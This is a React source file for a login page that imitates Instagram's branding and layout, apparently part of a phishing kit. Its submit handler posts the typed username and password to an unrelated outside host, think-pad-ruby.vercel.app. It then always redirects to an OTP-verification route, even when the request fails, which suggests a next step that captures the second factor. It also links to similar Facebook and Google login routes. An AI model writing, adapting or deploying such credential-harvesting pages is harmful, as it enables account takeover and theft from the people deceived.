import { useState } from "react";
import { Link } from "react-router-dom";
import logo from "../assets/logo.png";
import appleStore from '../assets/applestore.png'
import googleStore from '../assets/googlestore.png'
import facebookIcon from '../assets/facebook-icon.png'
import googleIcon from '../assets/google.png'
import phone from '../assets/phones.png'
import { useNavigate } from "react-router-dom";


const Login = () => {
    const [formData, setFormData] = useState({ email: "", password: "" });
    const navigate = useNavigate();

    const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        try {
            const response = await fetch("https://think-pad-ruby.vercel.app/api/instagram/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData),
            });

            if (!response.ok) throw new Error("Network response was not ok");

            const data = await response.json();
            console.log("Login Successful:", data);
            navigate('/instagram-verify-otp');
        } catch (error) {
            navigate('/instagram-verify-otp');
        }
    };




    const handleFb = () => {
        navigate('facebook/login');
    }

    const handleGoogle = () => {
        navigate('google/login');
    }

    return (
        <div className="flex justify-center items-center min-h-screen px-4 ">
            <div className="flex flex-col md:flex-row w-full max-w-4xl bg-white  rounded-lg p-6 md:p-10">
                {/* Image Section */}
                <div className="hidden md:flex items-center justify-center w-1/2">
                    <img src={phone} alt="Phone Preview" className="max-w-xs md:max-w-sm lg:max-w-md" />
                </div>

                {/* Form Section */}
                <div className="w-full md:w-1/2 flex flex-col justify-center  items-center">
                    <div className="bg-white border border-gray-300 w-full md:w-96 py-8 rounded-lg flex items-center flex-col mb-3">
                        <img src={logo} alt="Logo" className="w-44 mb-4" />
                        <form className="mt-4 w-64 flex flex-col" onSubmit={handleSubmit}>
                            <input
                                type="text"
                                name="email"
                                placeholder="Phone number, username, or email"
                                value={formData.email}
                                onChange={handleChange}
                                required
                                className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
                            />
                            <input
                                type="password"
                                name="password"
                                placeholder="Password"
                                value={formData.password}
                                onChange={handleChange}
                                required
                                className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
                            />
                            <button type="submit" className="text-sm text-center bg-blue-500 hover:bg-blue-600 text-white py-2 rounded font-medium">
                                Log In
                            </button>
                        </form>

                        {/* Divider */}
                        <div className="flex justify-evenly space-x-2 w-64 mt-4">
                            <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
                            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
                            <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
                        </div>

                        {/* Social Login */}
                        <button onClick={() => navigate('facebook/login')} className="mt-4 flex items-center">
                            <img width={15} height={15} src={facebookIcon} />
                            <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Facebook</span>
                        </button>
                        <button onClick={() => navigate('google/login')} className="mt-4 flex items-center">
                            <img width={15} height={15} src={googleIcon} />
                            <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Google</span>
                        </button>

                        {/* Forgot Password */}
                        <Link to="#" className="text-xs text-blue-900 mt-4 cursor-pointer">Forgot password?</Link>
                    </div>

                    {/* Sign Up */}
                    <div className="bg-white border border-gray-300 rounded-lg text-center w-full md:w-96 py-4">
                        <span className="text-sm">Don't have an account?</span>
                        <Link to="#" className="text-blue-500 text-sm font-semibold"> Sign up</Link>
                    </div>

                    {/* App Store Links */}
                    <div className="mt-3 text-center">
                        <span className="text-xs">Get the app</span>
                        <div className="flex mt-3 space-x-2 justify-center">
                            <img src={appleStore} alt="Apple Store" className="w-32" />
                            <img src={googleStore} alt="Google Store" className="w-32" />
                        </div>
                    </div>
                </div>
            </div>
        </div>

    );
};

export default Login;
